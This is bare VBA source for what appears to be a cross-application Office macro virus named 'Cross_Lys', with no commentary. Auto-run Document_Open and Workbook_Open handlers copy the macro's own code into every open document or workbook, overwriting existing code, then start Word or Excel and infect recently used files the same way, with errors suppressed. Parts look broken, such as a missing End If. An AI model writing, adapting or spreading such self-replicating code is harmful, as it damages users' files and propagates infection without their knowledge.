   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Workbook_Open()
   Cross_Lys Workbooks, ThisWorkbook, "Word.Application"
   End Sub
   Private Sub Document_Open()
   Cross_Lys Documents, ThisDocument, "Excel.Application"
   End Sub
   Private Function Cross_Lys(Target As Object, Host As Object, Cross As String)
   On Error Resume Next
   MyCode = Host.VBProject.VBComponents(1).CodeModule.Lines(1, Host.VBProject.VBComponents(1).CodeModule.CountOfLines)
   For X = 1 To Target.Count
   With Target(X).VBProject.VBComponents(1).CodeModule
   .DeleteLines 1, .CountOfLines
   .AddFromString MyCode
   Target(X).SaveAs FileName:=Documents(X).FullName
   End With
   Next
   Set CrossApp = GetObject(, Cross)
   If CrossApp = "" Then
   Set CrossApp = CreateObject(Cross)
   CrossQuit = True
   End If
   If CrossApp.Application.RecentFiles.Count >= 1 Then
   For X = 1 To CrossApp.Application.RecentFiles.Count
   With CrossApp.Application.RecentFiles(X).Open
   .VBProject.VBComponents(1).CodeModule.DeleteLines 1, .VBProject.VBComponents(1).CodeModule.CountOfLines
   .VBProject.VBComponents(1).CodeModule.AddFromString MyCode
   .SaveAs FileName:=.FullName
   End With
   Next
   If CrossQuit = True Then CrossApp.Quit
   End Function
